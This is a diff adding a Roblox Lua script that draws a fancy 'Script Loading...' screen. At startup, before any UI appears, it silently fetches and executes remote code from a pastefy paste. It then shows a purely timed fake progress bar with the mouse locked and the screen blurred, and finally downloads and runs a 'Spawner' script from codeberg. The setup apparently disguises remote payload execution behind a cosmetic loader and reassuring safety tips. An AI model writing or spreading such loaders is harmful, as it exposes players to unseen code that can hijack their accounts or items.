@@ -1,0 +1,258 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Lighting = game:GetService("Lighting")
+
+local player = Players.LocalPlayer
+
+-- Direct je script laden aan het begin
+pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/fQ92wDno/raw"))()
+end)
+
+-- ScreenGui aanmaken
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "FancyLoadingUI"
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Blur effect voor achtergrond
+local Blur = Instance.new("BlurEffect")
+Blur.Size = 20
+Blur.Parent = Lighting
+
+-- Semi-transparante zwarte achtergrond met blur zichtbaar
+local SoftBG = Instance.new("Frame")
+SoftBG.Size = UDim2.new(1,0,1,0)
+SoftBG.BackgroundColor3 = Color3.fromRGB(10,10,10)
+SoftBG.BackgroundTransparency = 0.45
+SoftBG.ZIndex = 0
+SoftBG.Parent = ScreenGui
+
+-- Start scherm (alleen start knop, muis niet locked)
+local StartFrame = Instance.new("Frame")
+StartFrame.Size = UDim2.new(1,0,1,0)
+StartFrame.BackgroundTransparency = 1
+StartFrame.ZIndex = 1
+StartFrame.Parent = ScreenGui
+
+local StartButton = Instance.new("TextButton")
+StartButton.Size = UDim2.new(0, 240, 0, 80)
+StartButton.Position = UDim2.new(0.5, -120, 0.5, -40)
+StartButton.BackgroundColor3 = Color3.fromRGB(15, 135, 255)
+StartButton.Text = "Start"
+StartButton.Font = Enum.Font.GothamBold
+StartButton.TextColor3 = Color3.new(1,1,1)
+StartButton.TextScaled = true
+StartButton.AutoButtonColor = false
+StartButton.ZIndex = 2
+StartButton.Parent = StartFrame
+Instance.new("UICorner", StartButton).CornerRadius = UDim.new(0, 20)
+
+StartButton.MouseEnter:Connect(function()
+    TweenService:Create(StartButton, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(0,120,230)}):Play()
+end)
+StartButton.MouseLeave:Connect(function()
+    TweenService:Create(StartButton, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(15,135,255)}):Play()
+end)
+
+-- Loading scherm setup (wazig, zwart overlay)
+local LoadingContainer = Instance.new("Frame")
+LoadingContainer.Size = UDim2.new(1,0,1,0)
+LoadingContainer.BackgroundTransparency = 1
+LoadingContainer.Visible = false
+LoadingContainer.ZIndex = 3
+LoadingContainer.Parent = ScreenGui
+
+local LoadingBG = Instance.new("Frame")
+LoadingBG.Size = UDim2.new(1,0,1,0)
+LoadingBG.BackgroundColor3 = Color3.new(0,0,0)
+LoadingBG.BackgroundTransparency = 0.7
+LoadingBG.ZIndex = 2
+LoadingBG.Parent = LoadingContainer
+
+local LoadingBlur = Instance.new("BlurEffect")
+LoadingBlur.Size = 15
+LoadingBlur.Parent = Lighting
+
+-- Laad venster (vierkant, midden)
+local Box = Instance.new("Frame")
+Box.Size = UDim2.new(0, 550, 0, 550)
+Box.AnchorPoint = Vector2.new(0.5, 0.5)
+Box.Position = UDim2.new(0.5, 0, 0.5, 0)
+Box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+Box.ZIndex = 5
+Box.ClipsDescendants = true
+Box.Parent = LoadingContainer
+Instance.new("UICorner", Box).CornerRadius = UDim.new(0, 25)
+
+-- Titel tekst
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0.15, 0)
+Title.Position = UDim2.new(0, 0, 0.05, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "Script Loading..."
+Title.Font = Enum.Font.GothamBold
+Title.TextScaled = true
+Title.TextColor3 = Color3.fromRGB(230, 230, 230)
+Title.ZIndex = 6
+Title.Parent = Box
+
+-- Progress bar background
+local ProgressBack = Instance.new("Frame")
+ProgressBack.Size = UDim2.new(0.8, 0, 0.08, 0)
+ProgressBack.Position = UDim2.new(0.1, 0, 0.85, 0)
+ProgressBack.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+ProgressBack.ZIndex = 6
+Instance.new("UICorner", ProgressBack).CornerRadius = UDim.new(1, 0)
+ProgressBack.Parent = Box
+
+-- Progress bar foreground
+local ProgressBar = Instance.new("Frame")
+ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 160, 255)
+ProgressBar.ZIndex = 7
+Instance.new("UICorner", ProgressBar).CornerRadius = UDim.new(1, 0)
+ProgressBar.Parent = ProgressBack
+
+-- Percentage tekst
+local PercentText = Instance.new("TextLabel")
+PercentText.Size = UDim2.new(1, 0, 1, 0)
+PercentText.BackgroundTransparency = 1
+PercentText.Font = Enum.Font.GothamBold
+PercentText.TextScaled = true
+PercentText.TextColor3 = Color3.new(1,1,1)
+PercentText.Text = "0%"
+PercentText.ZIndex = 8
+PercentText.Parent = ProgressBack
+
+-- Tips label
+local TipText = Instance.new("TextLabel")
+TipText.Size = UDim2.new(0.9, 0, 0.1, 0)
+TipText.Position = UDim2.new(0.05, 0, 0.75, 0)
+TipText.BackgroundTransparency = 1
+TipText.Font = Enum.Font.Gotham
+TipText.TextColor3 = Color3.fromRGB(190,190,190)
+TipText.TextScaled = true
+TipText.TextWrapped = true
+TipText.ZIndex = 6
+TipText.Text = ""
+TipText.Parent = Box
+
+-- Wolken animatie functie
+local function spawnCloud()
+    local cloud = Instance.new("ImageLabel")
+    cloud.Size = UDim2.new(0, math.random(80, 150), 0, math.random(40, 80))
+    cloud.Position = UDim2.new(-0.2, 0, math.random(), 0)
+    cloud.BackgroundTransparency = 1
+    cloud.Image = "rbxassetid://7733960988"
+    cloud.ImageTransparency = 0.25
+    cloud.ZIndex = 4
+    cloud.Parent = Box
+
+    local duration = math.random(12, 18)
+    TweenService:Create(cloud, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
+        Position = UDim2.new(1.2, 0, cloud.Position.Y.Scale, 0)
+    }):Play()
+
+    task.delay(duration + 1, function()
+        if cloud then cloud:Destroy() end
+    end)
+end
+
+task.spawn(function()
+    while true do
+        if LoadingContainer.Visible then
+            spawnCloud()
+        end
+        task.wait(1)
+    end
+end)
+
+-- Tips lijst
+local tips = {
+    "Stay safe!",
+    "Do not use other scripts.",
+    "Make sure to keep your account secure.",
+    "Always update your scripts.",
+    "Avoid suspicious links.",
+    "Trust only official sources.",
+    "Keep your software updated.",
+    "Use scripts responsibly.",
+    "Be aware of game rules.",
+    "Enjoy the game safely!"
+}
+
+-- Loading tijden (sec)
+local totalLoadTime = 20
+local fastDuration = 12
+local slowDuration = 8
+
+-- Functie om muis lock te zetten of te verwijderen
+local function setMouseLock(lock)
+    if lock then
+        UserInputService.ModalEnabled = true
+        UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
+        UserInputService.MouseIconEnabled = false
+    else
+        UserInputService.ModalEnabled = false
+        UserInputService.MouseBehavior = Enum.MouseBehavior.Default
+        UserInputService.MouseIconEnabled = true
+    end
+end
+
+-- Start knop event
+StartButton.MouseButton1Click:Connect(function()
+    StartFrame.Visible = false
+
+    -- Blur blijft actief, SoftBG blijft actief voor wazige achtergrond
+
+    LoadingContainer.Visible = true
+
+    setMouseLock(true)
+
+    local percent = 0
+    local startTime = tick()
+    local totalTips = #tips
+    local tipDisplayTime = totalLoadTime / totalTips
+    local lastTipIndex = 0
+
+    while percent < 100 do
+        local elapsed = tick() - startTime
+
+        if elapsed < fastDuration then
+            percent = math.clamp(elapsed / fastDuration * 60, 0, 60)
+        else
+            percent = math.clamp(60 + ((elapsed - fastDuration) / slowDuration * 40), 60, 100)
+        end
+
+        ProgressBar.Size = UDim2.new(percent / 100, 0, 1, 0)
+        PercentText.Text = string.format("%d%%", math.floor(percent))
+
+        -- Bereken welke tip getoond moet worden
+        local tipIndex = math.min(math.floor(elapsed / tipDisplayTime) + 1, totalTips)
+        if tipIndex ~= lastTipIndex then
+            TipText.Text = tips[tipIndex]
+            lastTipIndex = tipIndex
+        end
+
+        RunService.Heartbeat:Wait()
+    end
+
+    setMouseLock(false)
+    -- Na laden alles opruimen
+    ScreenGui:Destroy()
+    Blur:Destroy()
+
+    -- Script Spawner laden na loading compleet
+    local success, Spawner = pcall(function()
+        return loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
+    end)
+    if success and Spawner and Spawner.Load then
+        pcall(function()
+            Spawner.Load()
+        end)
+    end
+end)
